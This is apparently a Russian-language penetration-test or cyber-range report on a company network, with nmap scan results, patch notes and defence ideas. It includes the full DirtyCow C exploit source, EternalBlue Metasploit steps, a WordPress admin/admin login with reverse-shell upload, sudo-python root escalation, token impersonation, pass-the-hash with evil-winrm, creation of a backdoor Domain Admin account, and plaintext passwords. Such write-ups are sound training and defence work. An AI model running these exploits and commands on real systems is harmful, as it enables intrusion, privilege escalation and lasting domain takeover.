Карта сети
![](https://i.imgur.com/QgBJUiX.png)


# DMZ Сегмент
Мы просканировали 10.20.2.0/24 и нашли активные хосты:
10.20.2.10
10.20.2.11
10.20.2.12
10.20.2.53
```
10.20.2.10
 22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
 80/tcp    open  http    nginx 1.14.2
 3306/tcp  open  mysql   MySQL 
 8080/tcp  open  http    nginx 1.14.2
 33060/tcp open  mysqlx?

10.20.2.11
 22/tcp  open  ssh         OpenSSH 6.7p1 Debian 5 (protocol 2.0)
 80/tcp  open  http        Apache httpd 2.4.10 ((Debian))
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn Samba smbd 4.2.14-Debian (workgroup: WORKGROUP)

10.20.2.12
 22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
 25/tcp    open  smtp               SLmail smtpd 5.5.0.4433
 79/tcp    open  finger             SLMail fingerd
 106/tcp   open  pop3pw             SLMail pop3pw
 110/tcp   open  pop3               BVRP Software SLMAIL pop3d
 135/tcp   open  msrpc              Microsoft Windows RPC
 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
 180/tcp   open  http               Seattle Lab httpd 1.0
 445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
 3389/tcp  open  ssl/ms-wbt-server?
 5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49152/tcp open  msrpc              Microsoft Windows RPC
 49153/tcp open  msrpc              Microsoft Windows RPC
 49154/tcp open  msrpc              Microsoft Windows RPC
 49155/tcp open  msrpc              Microsoft Windows RPC
 49156/tcp open  msrpc              Microsoft Windows RPC
 49158/tcp open  msrpc              Microsoft Windows RPC
10.20.2.53
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
 53/tcp open  domain  ISC BIND
```

### 10.20.2.10
На 80 порту висит веб сервис. С помощью утилиты whatweb узнаем, что сайт запущен на WordPress. Попробуем авторизоваться со стандартными учетными данными в http://10.20.2.10/wp-admin (**login: admin**, **password: admin**) и получаем доступ. Загружаем reverse shell в папку plugins и получаем доступ на сервер. В файле /etc/sudoers находим интересную строчку: /etc/sudoers:www-data ALL=(ALL:ALL) NOPASSWD: /usr/bin/python. Это означает, что мы можем запустить python с привилегиями root.

Эксплуатируем:
```bash=
sudo python
import os
os.system(“/bin/bash”)
```
Получаем **root** доступ.
**Patch**:
Исправление misconfig: запретить выполнение **/usr/bin/python** с привилегиями sudo без пароля.

---

### 10.20.2.11
На 80 порту висит веб сервис. С помощью утилиты whatweb узнаем, что сайт написан на Drupal7. Эта версия имеет CVE-2018-7600. Используя poc (https://github.com/dreadlocked/Drupalgeddon2) получаем доступ на сервер под пользователем www-data.

Получаем **root** доступ.
Смотрим версию ядра на машине `uname -a` и понимаем, что оно старое -> уязвимо для CVE-2016-5195(DirtyCow)
```c=
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
const char *salt = "firefart";

int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

struct Userinfo {
   char *username;
   char *hash;
   int user_id;
   int group_id;
   char *info;
   char *home_dir;
   char *shell;
};

char *generate_password_hash(char *plaintext_pw) {
  return crypt(plaintext_pw, salt);
}

char *generate_passwd_line(struct Userinfo u) {
  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
  int size = snprintf(NULL, 0, format, u.username, u.hash,
    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
  char *ret = malloc(size + 1);
  sprintf(ret, format, u.username, u.hash, u.user_id,
    u.group_id, u.info, u.home_dir, u.shell);
  return ret;
}

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

int main(int argc, char *argv[])
{
  // backup file
  int ret = copy_file(filename, backup_filename);
  if (ret != 0) {
    exit(ret);
  }

  struct Userinfo user;
  // set values, change as needed
  user.username = "firefart";
  user.user_id = 0;
  user.group_id = 0;
  user.info = "pwned";
  user.home_dir = "/root";
  user.shell = "/bin/bash";

  char *plaintext_pw;

  if (argc >= 2) {
    plaintext_pw = argv[1];
    printf("Please enter the new password: %s\n", plaintext_pw);
  } else {
    plaintext_pw = getpass("Please enter the new password: ");
  }

  user.hash = generate_password_hash(plaintext_pw);
  char *complete_passwd_line = generate_passwd_line(user);
  printf("Complete line:\n%s\n", complete_passwd_line);

  f = open(filename, O_RDONLY);
  fstat(f, &st);
  map = mmap(NULL,
             st.st_size + sizeof(long),
             PROT_READ,
             MAP_PRIVATE,
             f,
             0);
  printf("mmap: %lx\n",(unsigned long)map);
  pid = fork();
  if(pid) {
    waitpid(pid, NULL, 0);
    int u, i, o, c = 0;
    int l=strlen(complete_passwd_line);
    for(i = 0; i < 10000/l; i++) {
      for(o = 0; o < l; o++) {
        for(u = 0; u < 10000; u++) {
          c += ptrace(PTRACE_POKETEXT,
                      pid,
                      map + o,
                      *((long*)(complete_passwd_line + o)));
        }
      }
    }
    printf("ptrace %d\n",c);
  }
  else {
    pthread_create(&pth,
                   NULL,
                   madviseThread,
                   NULL);
    ptrace(PTRACE_TRACEME);
    kill(getpid(), SIGSTOP);
    pthread_join(pth,NULL);
  }

  printf("Done! Check %s to see if the new user was created.\n", filename);
  printf("You can log in with the username '%s' and the password '%s'.\n\n",
    user.username, plaintext_pw);
    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
    backup_filename, filename);
  return 0;
}
```
Загружаем на машину, компилируем, получаем доступ к аккаунту с правами суперпользователя.

**Patch**
1. Установка последних обновлений Drupal
2. Установка последних обновлений на системе

### 10.20.2.12
Этот хост имеет уязвимость в Windows-реализации протокола SMB (**CVE-2017-0144**), поэтому мы можем успешно использовать эксплоит под кодовым именем **Eternalblue**.

Получаем **user** доступ.
На машине с Kali Linux выполним последовательность команд:

**msfconsole** - запуск Metasploit Framework
**use exploit/windows/smb/ms17_010_eternalblue** - выбираем эксплоит
**set RHOSTS хост1** - устанавливаем хост1 как цель для атаки
**run** - запускаем эксплоит

После удачной эксплуатации уязвимости мы получаем сессию meterpreter с NT AUTHORITY\SYSTEM

**Patch**
1. Установка последних обновлений на windows

---


# OFFICE Сегмент
Мы просканировали 10.20.4.0/24 и нашли:
10.20.4.6
10.20.4.8
10.20.4.10
10.20.4.13
```
10.20.4.6
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds?
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
 5040/tcp  open  unknown
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49664/tcp open  msrpc         Microsoft Windows RPC
 49665/tcp open  msrpc         Microsoft Windows RPC
 49666/tcp open  msrpc         Microsoft Windows RPC
 49670/tcp open  msrpc         Microsoft Windows RPC
 49671/tcp open  msrpc         Microsoft Windows RPC
 49705/tcp open  msrpc         Microsoft Windows RPC
 49709/tcp open  msrpc         Microsoft Windows RPC
 49712/tcp open  msrpc         Microsoft Windows RPC
10.20.4.8
 22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
 135/tcp   open  msrpc              Microsoft Windows RPC
 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: company)
 3389/tcp  open  ssl/ms-wbt-server?
 5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49152/tcp open  msrpc              Microsoft Windows RPC
 49153/tcp open  msrpc              Microsoft Windows RPC
 49154/tcp open  msrpc              Microsoft Windows RPC
 49174/tcp open  msrpc              Microsoft Windows RPC
 49178/tcp open  msrpc              Microsoft Windows RPC
 49189/tcp open  msrpc              Microsoft Windows RPC
10.20.4.10
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds?
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
 5040/tcp  open  unknown
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49664/tcp open  msrpc         Microsoft Windows RPC
 49665/tcp open  msrpc         Microsoft Windows RPC
 49666/tcp open  msrpc         Microsoft Windows RPC
 49670/tcp open  msrpc         Microsoft Windows RPC
 49671/tcp open  msrpc         Microsoft Windows RPC
 49701/tcp open  msrpc         Microsoft Windows RPC
 49705/tcp open  msrpc         Microsoft Windows RPC
 49708/tcp open  msrpc         Microsoft Windows RPC
10.20.4.13
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds?
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
 5040/tcp  open  unknown
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49664/tcp open  msrpc         Microsoft Windows RPC
 49665/tcp open  msrpc         Microsoft Windows RPC
 49666/tcp open  msrpc         Microsoft Windows RPC
 49670/tcp open  msrpc         Microsoft Windows RPC
 49671/tcp open  msrpc         Microsoft Windows RPC
 49701/tcp open  msrpc         Microsoft Windows RPC
 49703/tcp open  msrpc         Microsoft Windows RPC
 49707/tcp open  msrpc         Microsoft Windows RPC
```
### 10.20.4.8
Этот хост имеет уязвимость в Windows-реализации протокола SMB (**CVE-2017-0144**), поэтому мы можем успешно использовать эксплоит под кодовым именем **Eternalblue**.

Получаем **user** доступ.
На машине с Kali Linux выполним последовательность команд:

**msfconsole** - запуск Metasploit Framework
**use exploit/windows/smb/ms17_010_eternalblue** - выбираем эксплоит
**set RHOSTS хост1** - устанавливаем хост1 как цель для атаки
**run** - запускаем эксплоит

После удачной эксплуатации уязвимости мы получаем сессию meterpreter с NT AUTHORITY\SYSTEM

**Patch**
1. Установка последних обновлений на windows

---

# SERVERS Сегмент
Мы просканировали 10.20.4.0/24 и нашли:
10.20.3.10
10.20.3.20
10.20.3.50
```
10.20.3.10
 53/tcp    open  domain        Simple DNS Plus
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-  03-10 08:43:02Z)
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
 445/tcp   open  microsoft-ds?
 464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  tcpwrapped
 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
 3269/tcp  open  tcpwrapped
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 9389/tcp  open  mc-nmf        .NET Message Framing
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49664/tcp open  msrpc         Microsoft Windows RPC
 49665/tcp open  msrpc         Microsoft Windows RPC
 49666/tcp open  msrpc         Microsoft Windows RPC
 49667/tcp open  msrpc         Microsoft Windows RPC
 49668/tcp open  msrpc         Microsoft Windows RPC
 49670/tcp open  msrpc         Microsoft Windows RPC
 49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 49672/tcp open  msrpc         Microsoft Windows RPC
 49674/tcp open  msrpc         Microsoft Windows RPC
 49684/tcp open  msrpc         Microsoft Windows RPC
 49712/tcp open  msrpc         Microsoft Windows RPC
 59635/tcp open  msrpc         Microsoft Windows RPC
 62127/tcp open  msrpc         Microsoft Windows RPC
10.20.3.20
 25/tcp    open  smtp                 Microsoft Exchange smtpd
 80/tcp    open  http                 Microsoft IIS httpd 10.0
 81/tcp    open  http                 Microsoft IIS httpd 10.0
 110/tcp   open  pop3                 Microsoft Exchange 2007-2010 pop3d
 135/tcp   open  msrpc                Microsoft Windows RPC
 139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
 143/tcp   open  imap                 Microsoft Exchange 2007-2010 imapd
 443/tcp   open  ssl/http             Microsoft IIS httpd 10.0
 444/tcp   open  ssl/http             Microsoft IIS httpd 10.0
 445/tcp   open  microsoft-ds?
 465/tcp   open  smtp                 Microsoft Exchange smtpd
 475/tcp   open  smtp
 476/tcp   open  smtp
 477/tcp   open  smtp
 587/tcp   open  smtp                 Microsoft Exchange smtpd
 593/tcp   open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
 717/tcp   open  smtp                 Microsoft Exchange smtpd
 808/tcp   open  ccproxy-http?
 890/tcp   open  mc-nmf               .NET Message Framing
 993/tcp   open  ssl/imap             Microsoft Exchange 2007-2010 imapd
 995/tcp   open  ssl/pop3             Microsoft Exchange 2007-2010 pop3d
 1801/tcp  open  msmq?
 1993/tcp  open  ssl/imap             Microsoft Exchange 2007-2010 imapd
 1995/tcp  open  ssl/pop3             Microsoft Exchange 2007-2010 pop3d
 2103/tcp  open  msrpc                Microsoft Windows RPC
 2105/tcp  open  msrpc                Microsoft Windows RPC
 2107/tcp  open  msrpc                Microsoft Windows RPC
 2525/tcp  open  smtp                 Microsoft Exchange smtpd
 3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
 3800/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 3801/tcp  open  mc-nmf               .NET Message Framing
 3803/tcp  open  mc-nmf               .NET Message Framing
 3823/tcp  open  mc-nmf               .NET Message Framing
 3828/tcp  open  mc-nmf               .NET Message Framing
 3843/tcp  open  mc-nmf               .NET Message Framing
 3863/tcp  open  mc-nmf               .NET Message Framing
 3867/tcp  open  mc-nmf               .NET Message Framing
 3875/tcp  open  msexchange-logcopier Microsoft Exchange 2010 log copier
 5985/tcp  open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 6001/tcp  open  ncacn_http           Microsoft Windows RPC over HTTP 1.0
 6400/tcp  open  msrpc                Microsoft Windows RPC
 6401/tcp  open  msrpc                Microsoft Windows RPC
 6402/tcp  open  msrpc                Microsoft Windows RPC
 6403/tcp  open  msrpc                Microsoft Windows RPC
 6404/tcp  open  msrpc                Microsoft Windows RPC
 6405/tcp  open  msrpc                Microsoft Windows RPC
 6406/tcp  open  msrpc                Microsoft Windows RPC
 6409/tcp  open  msrpc                Microsoft Windows RPC
 6411/tcp  open  msrpc                Microsoft Windows RPC
 6432/tcp  open  msrpc                Microsoft Windows RPC
 6455/tcp  open  msrpc                Microsoft Windows RPC
 6538/tcp  open  msrpc                Microsoft Windows RPC
 6546/tcp  open  msrpc                Microsoft Windows RPC
 6548/tcp  open  msrpc                Microsoft Windows RPC
 6549/tcp  open  msrpc                Microsoft Windows RPC
 6559/tcp  open  msrpc                Microsoft Windows RPC
 6567/tcp  open  msrpc                Microsoft Windows RPC
 6569/tcp  open  msrpc                Microsoft Windows RPC
 6570/tcp  open  msrpc                Microsoft Windows RPC
 6574/tcp  open  msrpc                Microsoft Windows RPC
 6576/tcp  open  msrpc                Microsoft Windows RPC
 6579/tcp  open  msrpc                Microsoft Windows RPC
 6581/tcp  open  msrpc                Microsoft Windows RPC
 6587/tcp  open  msrpc                Microsoft Windows RPC
 6593/tcp  open  msrpc                Microsoft Windows RPC
 6608/tcp  open  msrpc                Microsoft Windows RPC
 6610/tcp  open  msrpc                Microsoft Windows RPC
 6630/tcp  open  msrpc                Microsoft Windows RPC
 6632/tcp  open  msrpc                Microsoft Windows RPC
 6654/tcp  open  msrpc                Microsoft Windows RPC
 6657/tcp  open  msrpc                Microsoft Windows RPC
 6666/tcp  open  msrpc                Microsoft Windows RPC
 6667/tcp  open  msrpc                Microsoft Windows RPC
 6693/tcp  open  msrpc                Microsoft Windows RPC
 6710/tcp  open  msrpc                Microsoft Windows RPC
 6751/tcp  open  msrpc                Microsoft Windows RPC
 6752/tcp  open  msrpc                Microsoft Windows RPC
 6754/tcp  open  msrpc                Microsoft Windows RPC
 6802/tcp  open  msrpc                Microsoft Windows RPC
 6849/tcp  open  msrpc                Microsoft Windows RPC
 6851/tcp  open  msrpc                Microsoft Windows RPC
 6869/tcp  open  msrpc                Microsoft Windows RPC
 6880/tcp  open  msrpc                Microsoft Windows RPC
 6902/tcp  open  msrpc                Microsoft Windows RPC
 6910/tcp  open  msrpc                Microsoft Windows RPC
 6921/tcp  open  msrpc                Microsoft Windows RPC
 7037/tcp  open  msrpc                Microsoft Windows RPC
 7087/tcp  open  msrpc                Microsoft Windows RPC
 7116/tcp  open  msrpc                Microsoft Windows RPC
 7227/tcp  open  msrpc                Microsoft Windows RPC
 8172/tcp  open  ssl/http             Microsoft IIS httpd 10.0
 8199/tcp  open  msrpc                Microsoft Windows RPC
 8210/tcp  open  msrpc                Microsoft Windows RPC
 9710/tcp  open  mc-nmf               .NET Message Framing
 47001/tcp open  http                 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 64327/tcp open  msexchange-logcopier Microsoft Exchange 2010 log copier
 64337/tcp open  mc-nmf               .NET Message Framing
10.20.3.50
 53/tcp    open  domain        Simple DNS Plus
 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-10 08:46:12Z)
 135/tcp   open  msrpc         Microsoft Windows RPC
 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
 445/tcp   open  microsoft-ds?
 464/tcp   open  kpasswd5?
 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 636/tcp   open  tcpwrapped
 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: company.local0., Site: Default-First-Site-Name)
 3269/tcp  open  tcpwrapped
 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 9389/tcp  open  mc-nmf        .NET Message Framing
 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49664/tcp open  msrpc         Microsoft Windows RPC
 49665/tcp open  msrpc         Microsoft Windows RPC
 49666/tcp open  msrpc         Microsoft Windows RPC
 49667/tcp open  msrpc         Microsoft Windows RPC
 49668/tcp open  msrpc         Microsoft Windows RPC
 49670/tcp open  msrpc         Microsoft Windows RPC
 49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
 49672/tcp open  msrpc         Microsoft Windows RPC
 49674/tcp open  msrpc         Microsoft Windows RPC
 49684/tcp open  msrpc         Microsoft Windows RPC
 49723/tcp open  msrpc         Microsoft Windows RPC
 57847/tcp open  msrpc         Microsoft Windows RPC
 63180/tcp open  msrpc         Microsoft Windows RPC
```
# АСУ-ТП Сегмент
Мы просканировали 10.20.240.0/24, 10.20.239.0/24 и нашли:
10.20.239.5
10.20.239.6
10.20.240.9
10.20.240.10
10.20.240.14
```
10.20.239.5
 22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
 80/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 135/tcp   open  msrpc              Microsoft Windows RPC
 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: company)
 950/tcp   open  oftep-rpc?
 1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.7001.00; SP4
 3389/tcp  open  ssl/ms-wbt-server?
 5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49152/tcp open  msrpc              Microsoft Windows RPC
 49153/tcp open  msrpc              Microsoft Windows RPC
 49154/tcp open  msrpc              Microsoft Windows RPC
 49184/tcp open  ms-sql-s           Microsoft SQL Server 2012 11.00.7001
 49190/tcp open  msrpc              Microsoft Windows RPC
 49194/tcp open  msrpc              Microsoft Windows RPC
 49197/tcp open  msrpc              Microsoft Windows RPC
10.20.239.6
 22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
 135/tcp   open  msrpc              Microsoft Windows RPC
 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: company)
 3389/tcp  open  ssl/ms-wbt-server?
 5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49152/tcp open  msrpc              Microsoft Windows RPC
 49153/tcp open  msrpc              Microsoft Windows RPC
 49154/tcp open  msrpc              Microsoft Windows RPC
 49175/tcp open  msrpc              Microsoft Windows RPC
 49189/tcp open  msrpc              Microsoft Windows RPC
 49201/tcp open  msrpc              Microsoft Windows RPC
10.20.240.5
 22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 80/tcp   open  http      JBoss Enterprise Application Platform
 102/tcp  open  iso-tsap?
 5077/tcp open  ftp       oftpd
10.20.240.6
 22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 80/tcp   open  http      JBoss Enterprise Application Platform
 102/tcp  open  iso-tsap?
 5077/tcp open  ftp       oftpd
10.20.240.9
 22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 80/tcp   open  http      JBoss Enterprise Application Platform
 102/tcp  open  iso-tsap?
 5077/tcp open  ftp       oftpd
10.20.240.10
 22/tcp   open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 80/tcp   open  http      JBoss Enterprise Application Platform
|_http-title: SIEDWEB
 102/tcp  open  iso-tsap?
 5077/tcp open  ftp       oftpd
10.20.240.14
 22/tcp    open  ssh                OpenSSH for_Windows_8.6 (protocol 2.0)
 135/tcp   open  msrpc              Microsoft Windows RPC
 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
 502/tcp   open  mbap?
 2404/tcp  open  iec-104?
 3389/tcp  open  ssl/ms-wbt-server?
 5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 5986/tcp  open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 30291/tcp open  unknown
 47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 49152/tcp open  msrpc              Microsoft Windows RPC
 49153/tcp open  msrpc              Microsoft Windows RPC
 49154/tcp open  msrpc              Microsoft Windows RPC
 49155/tcp open  msrpc              Microsoft Windows RPC
 49156/tcp open  msrpc              Microsoft Windows RPC
 49157/tcp open  msrpc              Microsoft Windows RPC
```
### 10.20.239.5
### 10.20.239.6
### 10.20.240.14

Имеют уязвимость в Windows-реализации протокола SMB (**CVE-2017-0144**), поэтому мы можем успешно использовать эксплоит под кодовым именем **Eternalblue**.

Для эксплуатации уязвимости выберем хост1.

На машине с Kali Linux выполним последовательность команд:

**msfconsole** - запуск Metasploit Framework
**use exploit/windows/smb/ms17_010_eternalblue** - выбираем эксплоит
**set RHOSTS хост1** - устанавливаем хост1 как цель для атаки
**run** - запускаем эксплоит

После удачной эксплуатации уязвимости мы получаем сессию meterpreter

**Patch**
1. Установка последних обновлений на windows
### Получение сессии администратора домена company.local

Выполним последовательность команд для получения сессии администратора домена company.local на 10.20.239.6 

**getuid** - выводим пользователя, на котором работает сервер meterpreter на хост1
Вывод команды: NT AUTHORITY\SYSTEM
По сути это означает, что мы работаем от самой "мощной" локальной учетной записи Windows.

Далее проведем технику, называемую "**Token Impersonation**"

Если кратко, так называется метод, с помощью которого локальный администратор Windows может украсть токен безопасности другого пользователя, чтобы выдавать себя за этого пользователя и выполнять команды от его лица.

**load incognito** - загружаем в meterpreter расширение incognito
**list_tokens -u** - получаем список доступных токенов
**impersonate_token company.local\\Administrator** - проводим Impersonation с одним из доступных токенов
**getuid** - после успешного выполнения прошлой команды проверяем, на каком пользователе работает meterpreter сейчас. Действительно, сейчас мы можем работать от имени company.local\Administrator

После получения прав администратора домена, загрузим на 10.20.239.6 файл скрипта PowerShell - SharpHound.ps1, который позволит нам провести разведку доменной сети. 

**wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1** - в другой вкладке откроем терминал и на машину с Kali Linux загрузим SharpHound.ps1
**upload SharpHound1.ps1** - загружаем /home/kali/SharpHound.ps1 в папку C:\Windows\system32\
**shell** - запускаем Windows Shell от лица администратора домена company.local
**powershell -ep bypass** - получаем оболочку PowerShell вместо стандартной
**. .\SharpHound.ps1** - запускаем сценарий, который "подгрузит" необходимые команды в оболочку PowerShell
**Invoke-BloodHound -CollectionMethod All** - запускаем сбор информации о доменной сети

Далее загружаем себе на машину получившийся файл командой **upload <file>**
Для дальнейшего просмотра сети загрузим один из релизов BloodHound с официального github-репозитория - https://github.com/BloodHoundAD/BloodHound
    
Распаковываем .zip файл, заходим в получившуюся папку и записываем команды:
**sudo neo4j start** 
**./BloodHound**

После запуска загружаем скачанный с 10.20.239.6 архив по кнопке "Upload Data"
Изучив сеть, по итогу получаем такую картину:
![](https://i.imgur.com/8MEGnzH.png)
    
    
# Пользователи
oper:Mexico1
Administrator:Server1
    
    
# Получение Domain Admin access
После получения system access на 10.20.4.8 
![](https://i.imgur.com/2d6pPF0.png)
Дампим все хэши, получаем хэш `cadm` пользователя и при помощи техники PassTheHash логинимся на сервере:
> evil-winrm -i 10.20.3.10 -u cadm -H 3e3b...4e55

Получаем учетку на сервере и создаем нового пользоателя, чтобы иметь возможность восстановить другие компьютеры, не имея пароля к `cadm`.
>cmd /c 'net user /add Fox Eg123!! /domain'
>cmd /c 'net group "Domain Admins" Fox /add /domain'
    
Теперь пользователь `Fox` является Domain Admin, что позволяет нам подключаться к любому компьютеру. 
    
    
    

# Идеи для защиты
- На каждом сервере выключен firewall, что небезопасно. Нужно включить 
![](https://i.imgur.com/hngRmos.png)
    > netsh advfirewall set allprofiles state on
- Смена паролей на всех учетных данных(пример для администратора)
    > net user Administrator SuperSecretPassword123! /domain
- Обновление всех машин до последней версии
- Обновление всех сервисов до последней версии
